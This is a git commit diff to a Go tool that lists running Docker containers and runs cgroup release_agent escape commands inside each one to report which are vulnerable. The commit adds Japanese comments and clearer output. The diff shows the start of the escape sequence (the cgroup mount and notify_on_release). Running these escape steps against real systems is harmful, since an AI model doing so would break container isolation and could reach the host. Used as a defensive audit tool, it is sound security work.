a2ad517b0fa1e050d4733bd9924631d5b6ee1b0f
yokoyama443 <j122357@ns.kogakuin.ac.jp>
2024-06-10 08:35:22 +0900

    Update main.go

--- main.go
+++ main.go
@@ -13,7 +13,9 @@ import (
 )
 
 func main() {
+	// 危険なコンテナのIDを格納するファイル
 	filePath := "/tmp/cec"
+
 	// ファイルが存在する場合は削除
 	if _, err := os.Stat(filePath); err == nil {
 		os.Remove(filePath)
@@ -27,21 +29,26 @@ func main() {
 	}
 	defer file.Close()
 
+	// Dockerクライアントを作成
 	cli, err := client.NewClientWithOpts(client.FromEnv)
 	if err != nil {
 		panic(err)
 	}
 
+	// コンテナのリストを取得
 	containers, err := cli.ContainerList(context.Background(), container.ListOptions{})
 	if err != nil {
 		panic(err)
 	}
 
+	// コンテナのIDを保管するスライスを作成
 	containerIDs := make([]string, len(containers))
 
+	// コンテナごとにコマンドを実行
 	for i, container := range containers {
 		containerIDs[i] = container.ID
 		fmt.Printf("Container ID: %s\n", container.ID)
+		// コンテナエスケープに使うコマンド
 		commands := [][]string{
 			{"sh", "-c", `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
 			{"sh", "-c", `echo 1 > /tmp/cgrp/x/notify_on_release`},
@@ -83,13 +90,21 @@ func main() {
 		lines = append(lines, scanner.Text())
 	}
 
-	for i, containerID := range containerIDs {
-		for j, line := range lines {
+	fmt.Println("Dangerous containers are")
+	escapeFlag := false
+
+	for _, containerID := range containerIDs {
+		for _, line := range lines {
 			if line == containerID {
-				fmt.Printf("Match found at index %d (file line %d): %s\n", i, j, containerID)
+				escapeFlag = true
+				fmt.Printf("Privileged Escape : %s\n", containerID)
 				break
 			}
 		}
+	}
+
+	if escapeFlag == false {
+		fmt.Println("not available !!!")
 	}
 
 	if err := scanner.Err(); err != nil {
